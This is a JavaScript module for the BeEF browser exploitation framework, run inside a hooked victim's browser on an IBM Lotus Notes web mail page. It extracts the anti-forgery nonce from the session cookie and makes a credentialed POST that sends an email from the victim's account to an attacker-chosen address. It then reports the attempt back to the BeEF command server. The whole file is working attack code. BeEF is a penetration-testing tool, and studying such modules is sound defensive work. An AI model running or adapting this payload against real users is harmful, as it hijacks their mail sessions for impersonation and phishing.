//
//   Copyright (c) 2006-2014 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//
beef.execute(function() {
	var to = "<%= CGI::escape(@to) %>";
	var subject = "<%= CGI::escape(@subject) %>";
	var body = "<%= CGI::escape(@body) %>";

	//get URL for this nsf databse
	var currentURL = document.URL;
	var rx = /(.*\.nsf)/g;
	var arr = rx.exec(currentURL);
	var notesURL = arr[1];

	//extract nonce from ShimmerS-cookie
	var cookies = document.cookie;
	var rxc = /ShimmerS=.*?N:([A-Za-z0-9]*)/g;
	var arrc = rxc.exec(cookies);
	var nonce = arrc[1];
	
	var xhr = new XMLHttpRequest();
	var uri = notesURL + "/($Inbox)/$new/?EditDocument&Form=h_PageUI&PresetFields=h_EditAction;h_ShimmerEdit,s_ViewName;($Inbox),s_NotesForm;Memo&ui=dwa_form";
	xhr.open("POST", uri, true);
	xhr.withCredentials = true;
	xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	var post_data = "%25%25Nonce="+nonce+"&h_EditAction=h_Next&h_SetReturnURL=%5B%5B.%2F%26Form%3Dl_CallListener%5D%5D&h_SetCommand=h_ShimmerSendMail&h_SetSaveDoc=1&SendTo="+to+"&CopyTo=&BlindCopyTo=&Body="+body+"&MailOptions=1&Form=Memo&s_UsePlainText=0&s_UsePlainTextAndHTML=0&Subject="+subject;

	xhr.send(post_data);

	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Attempt to send note.');
});





 
